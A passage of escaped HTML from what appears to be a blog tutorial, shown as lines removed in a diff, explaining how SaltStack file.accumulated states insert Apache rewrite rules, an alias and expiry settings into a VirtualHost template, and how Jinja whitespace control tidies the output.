-&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;If you run the state nothing should move, except maybe the two comments lines. The thing we need to do now is to feed this accumulator variable with &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt; states. On theses states the &lt;code&gt;name&lt;/code&gt; of the state will match the accumulator key.&lt;/p&gt;
-
-&lt;p&gt;So, for this example, we will use a second sls file &lt;code&gt;more-things-for-virtualhost.sls&lt;/code&gt; :&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p-Indicator&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# Include dependencies #}&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;- example_com_apache_virtualhost&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;example-a-first-rewrite-rule&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;extra-settings-example-virtualhost-maindir&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# this is an example of thing added in the middle&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;RewriteEngine On&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;RewriteCond %&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;REQUEST_FILENAME&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;-d&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;RewriteRule ^(.+&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;^/&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;)$  $1/&lt;/span&gt;  &lt;span class=&quot;p-Indicator&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;100_example_com_virtualhost&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;example-some-icons-added&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;extra-settings-example-virtualhost&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# this is an example of thing added at the end&amp;#39;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;Alias /icons /path/to/icons&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;&amp;lt;Directory /path/to/icons&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;               &lt;span class=&quot;nv&quot;&gt;Order allow&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;deny&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;               &lt;span class=&quot;nv&quot;&gt;Allow from all&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;100_example_com_virtualhost&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;example-another-thing&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;extra-settings-example-virtualhost-maindir&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# this is another example of thing added in the middle&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;RewriteRule    ^/cgi-bin/imagemap(.*)  $1&lt;/span&gt;  &lt;span class=&quot;p-Indicator&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PT&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;100_example_com_virtualhost&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;example-a-first-rewrite-rule&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;example-another-thing-again&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;44&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;45&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;extra-settings-example-virtualhost-maindir&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;46&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;47&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;48&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# this is another example of thing added in the middle&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;49&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;&amp;lt;FilesMatch &amp;quot;\.(gif|jpe&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;g|png)$&amp;quot;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;50&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;ExpiresDefault A2592000&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;51&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;52&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;53&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;100_example_com_virtualhost&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Now let's run this new sls:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;salt-call -linfo state.sls more-things-for-virtualhost&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;You should get a nice diff showing you that all theses states added content on the right place:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;+++&lt;/span&gt; 
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;-21,9&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;+21,41&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;          &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;# Here any extra configuration settings if any:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;          
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# this is an example of thing added in the middle&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;On&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_FILENAME}  -d
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; ^(.+[^/])$  $1/  [R]
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# this is another example of thing added in the middle&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt;    ^/cgi-bin/imagemap(.*)  $1  [PT]
-&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
-&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# this is another example of thing added in the middle&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;\.(gif|jpe?g|png)$&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;ExpiresDefault&lt;/span&gt; A2592000
-&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
-&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
-&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
-&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;      
-&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;# Here any extra configuration settings if any:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;      
-&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;      
-&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# this is an example of thing added at the end&amp;#39;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Alias&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/icons&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/path/to/icons&lt;/span&gt;&amp;gt;
-&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Directory&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/path/to/icons&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; allow,deny
-&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;You can see that some extra spaces were added by my jinja control commands. We can strip down those whitespaces with jinja's&lt;code&gt;-&lt;/code&gt;. Instead of:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-jinja&quot; data-lang=&quot;jinja&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Use:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-jinja&quot; data-lang=&quot;jinja&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; -&lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt; -&lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
